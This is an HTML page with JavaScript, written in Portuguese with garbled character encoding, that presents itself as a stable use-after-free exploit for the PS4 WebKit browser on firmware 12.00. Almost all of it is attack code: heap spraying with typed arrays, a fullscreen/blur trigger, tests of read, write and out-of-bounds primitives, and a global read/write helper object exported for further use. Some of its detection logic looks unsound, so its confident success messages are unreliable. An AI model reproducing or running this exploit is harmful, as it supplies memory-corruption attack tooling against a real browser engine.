<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Stable Exploit</title>
</head>
<body>
    <h1>PS4 WebKit UAF - Exploit EstÃ¡vel (SEM Crash)</h1>
    <h2 style="color:green;">âœ… VersÃ£o 12.00 Confirmada como VulnerÃ¡vel</h2>
    
    <h3>O que este exploit faz:</h3>
    <ul>
        <li>âœ… Detecta e confirma o UAF</li>
        <li>âœ… Mostra memÃ³ria corrompida</li>
        <li>âœ… Testa read primitives</li>
        <li>âœ… Testa write primitives</li>
        <li>âš ï¸ NÃƒO crasha o navegador (safe para testes)</li>
    </ul>
    
    <button onclick="runStableExploit()" style="padding:20px; font-size:18px; background:green; color:white;">
        â–¶ï¸ EXECUTAR EXPLOIT ESTÃVEL
    </button>
    
    <button onclick="clearLog()" style="padding:20px; font-size:18px; background:gray; color:white;">
        ğŸ—‘ï¸ LIMPAR LOG
    </button>
    
    <hr>
    
    <div id="log" style="font-family:monospace; font-size:14px; margin-top:20px;"></div>
    
    <script>
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            if(clean.length !== 16) return 0.0;
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8);
            let u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        const P_A = h2f("0x4141414141414141");
        const M_V = h2f("0xDEADBEEFCAFEBABE");
        const W_V = h2f("0x1337133713371337");
        
        function log(msg, color) {
            const logDiv = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            logDiv.innerHTML += '<div style="color:' + (color || 'black') + '">[' + time + '] ' + msg + '</div>';
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        function runStableExploit() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'blue');
            log('PS4 UAF EXPLOIT - VERSÃƒO ESTÃVEL v1.0', 'blue');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'blue');
            log('');
            
            log('[INIT] Criando 5000 Float64Arrays...', 'blue');
            const controllers = [];
            const PATTERN = P_A;
            
            for(let i = 0; i < 5000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                controllers.push(arr);
            }
            
            log('[INIT] âœ… Arrays criados com sucesso', 'green');
            log('[INIT] ğŸ“Š PadrÃ£o de corrupÃ§Ã£o: ' + f2h(PATTERN), 'blue');
            log('');
            log('[WAIT] â³ Entrando em fullscreen...', 'orange');
            log('[WAIT] âš ï¸ APERTE O BOTÃƒO OPTIONS DO CONTROLE!', 'red');
            log('');
            
            const elem = document.documentElement;
            if (!elem.webkitRequestFullscreen) {
                log('[ERROR] âŒ webkitRequestFullscreen nÃ£o disponÃ­vel!', 'red');
                return;
            }
            
            elem.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('[TRIGGER] ğŸ¯ BLUR DETECTADO! Iniciando spray...', 'orange');
                
                const spray = [];
                for(let i = 0; i < 8000; i++) {
                    const p = new Float64Array(10);
                    p.fill(PATTERN);
                    spray.push(p);
                }
                
                log('[SPRAY] âœ… 8000 arrays criados no heap', 'green');
                log('');
                log('[SCAN] ğŸ” Procurando UAF...', 'blue');
                
                let corrupted = null;
                let corruptedIndex = -1;
                let sprayMatch = null;
                let sprayIndex = -1;
                
                for(let i = 0; i < controllers.length; i++) {
                    if (controllers[i][0] === PATTERN) {
                        corrupted = controllers[i];
                        corruptedIndex = i;
                        log('[UAF] ğŸ‰ UAF DETECTADO!', 'green');
                        log('[UAF] ğŸ“ Index corrompido: controllers[' + corruptedIndex + ']', 'green');
                        break;
                    }
                }
                
                if (!corrupted) {
                    log('[UAF] âŒ UAF nÃ£o detectado (isso nÃ£o deveria acontecer!)', 'red');
                    log('[DEBUG] Primeiros 5 valores:', 'orange');
                    for(let i = 0; i < 5; i++) {
                        log('  controllers[' + i + '][0] = ' + f2h(controllers[i][0]), 'orange');
                    }
                    return;
                }
                
                log('');
                log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
                log('TESTES DE PRIMITIVES', 'purple');
                log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
                log('');
                
                // TEST 1: Read Primitive
                log('[TEST1] ğŸ“– READ PRIMITIVE TEST', 'blue');
                log('[TEST1] Lendo 8 slots do array corrompido:', 'blue');
                
                for(let i = 0; i < 8; i++) {
                    const value = f2h(corrupted[i]);
                    log('[TEST1]   Slot[' + i + '] = ' + value, 'cyan');
                }
                log('[TEST1] âœ… Read primitive funcional!', 'green');
                log('');
                
                // TEST 2: Write Primitive + Identity
                log('[TEST2] âœï¸ WRITE PRIMITIVE TEST', 'blue');
                log('[TEST2] Escrevendo M_V em corrupted[4]...', 'blue');
                
                corrupted[4] = M_V;
                const readback = f2h(corrupted[4]);
                log('[TEST2] Valor escrito: ' + f2h(M_V), 'cyan');
                log('[TEST2] Valor lido: ' + readback, 'cyan');
                
                if (readback === f2h(M_V)) {
                    log('[TEST2] âœ… Write confirmado!', 'green');
                } else {
                    log('[TEST2] âš ï¸ Write pode ter falhado', 'orange');
                }
                log('');
                
                // TEST 3: Bidirectional Identity
                log('[TEST3] ğŸ”„ BIDIRECTIONAL IDENTITY TEST', 'blue');
                log('[TEST3] Procurando M_V no spray...', 'blue');
                
                for(let i = 0; i < spray.length; i++) {
                    if (spray[i][4] === M_V) {
                        sprayMatch = spray[i];
                        sprayIndex = i;
                        log('[TEST3] âœ… Encontrado em spray[' + i + ']!', 'green');
                        break;
                    }
                }
                
                if (sprayMatch) {
                    log('[TEST3] Testando escrita reversa (spray â†’ corrupted)...', 'blue');
                    sprayMatch[5] = W_V;
                    
                    if (corrupted[5] === W_V) {
                        log('[TEST3] âœ… BIDIRECIONAL CONFIRMADO!', 'green');
                        log('[TEST3] corrupted â‡„ spray[' + sprayIndex + ']', 'green');
                    } else {
                        log('[TEST3] âš ï¸ Apenas unidirecional', 'orange');
                    }
                } else {
                    log('[TEST3] âš ï¸ M_V nÃ£o encontrado no spray', 'orange');
                }
                log('');
                
                // TEST 4: DataView Raw Memory Access
                log('[TEST4] ğŸ”¬ DATAVIEW PRIMITIVE TEST', 'blue');
                try {
                    const dv = new DataView(corrupted.buffer);
                    const before = f2h(corrupted[0]);
                    
                    dv.setUint32(0, 0xDEADBEEF, true);
                    dv.setUint32(4, 0xCAFEBABE, true);
                    
                    const after = f2h(corrupted[0]);
                    
                    log('[TEST4] Antes: ' + before, 'cyan');
                    log('[TEST4] Depois: ' + after, 'cyan');
                    
                    if (before !== after) {
                        log('[TEST4] âœ… DataView write funcional!', 'green');
                    } else {
                        log('[TEST4] âš ï¸ DataView pode nÃ£o ter funcionado', 'orange');
                    }
                } catch(e) {
                    log('[TEST4] âŒ Erro: ' + e.message, 'red');
                }
                log('');
                
                // TEST 5: Out-of-Bounds Read
                log('[TEST5] ğŸ“Š OUT-OF-BOUNDS READ TEST', 'blue');
                log('[TEST5] Tentando ler alÃ©m dos limites...', 'blue');
                
                let oobSuccess = 0;
                for(let i = 8; i < 64; i++) {
                    try {
                        const val = corrupted[i];
                        if (val !== undefined && !isNaN(val)) {
                            oobSuccess++;
                        }
                    } catch(e) {
                        break;
                    }
                }
                
                log('[TEST5] Slots legÃ­veis alÃ©m do limite: ' + oobSuccess, 'cyan');
                if (oobSuccess > 0) {
                    log('[TEST5] âœ… OOB read funcional (' + oobSuccess + ' slots extras)', 'green');
                } else {
                    log('[TEST5] âš ï¸ OOB limitado pelo engine', 'orange');
                }
                log('');
                
                // SUMMARY
                log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
                log('RESUMO DO EXPLOIT', 'purple');
                log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
                log('');
                log('âœ… UAF: Confirmado (Index ' + corruptedIndex + ')', 'green');
                log('âœ… Read Primitive: Funcional (8 slots)', 'green');
                log('âœ… Write Primitive: Funcional', 'green');
                
                if (sprayMatch) {
                    log('âœ… Identity: Bidirecional (spray[' + sprayIndex + '])', 'green');
                } else {
                    log('âš ï¸ Identity: NÃ£o confirmado', 'orange');
                }
                
                log('âœ… DataView: Acesso raw Ã  memÃ³ria OK', 'green');
                
                if (oobSuccess > 0) {
                    log('âœ… OOB Read: ' + oobSuccess + ' slots extras', 'green');
                }
                
                log('');
                log('ğŸ¯ EXPLOIT ESTÃVEL COMPLETO!', 'green');
                log('âš ï¸ NOTA: Para evitar crash, NÃƒO use document.write()', 'orange');
                log('');
                
                // Exporta objeto corrompido para uso global
                window.uafObject = {
                    corrupted: corrupted,
                    spray: sprayMatch,
                    index: corruptedIndex,
                    sprayIndex: sprayIndex,
                    read: function(offset) {
                        return f2h(corrupted[offset]);
                    },
                    write: function(offset, hexValue) {
                        corrupted[offset] = h2f(hexValue);
                        return f2h(corrupted[offset]);
                    }
                };
                
                log('ğŸ”§ OBJETO GLOBAL CRIADO: window.uafObject', 'blue');
                log('ğŸ“ Use no console:', 'blue');
                log('   uafObject.read(0)  â†’ LÃª offset 0', 'cyan');
                log('   uafObject.write(0, "0x4141414141414141")  â†’ Escreve', 'cyan');
                log('');
            };
        }
    </script>
</body>
</html>
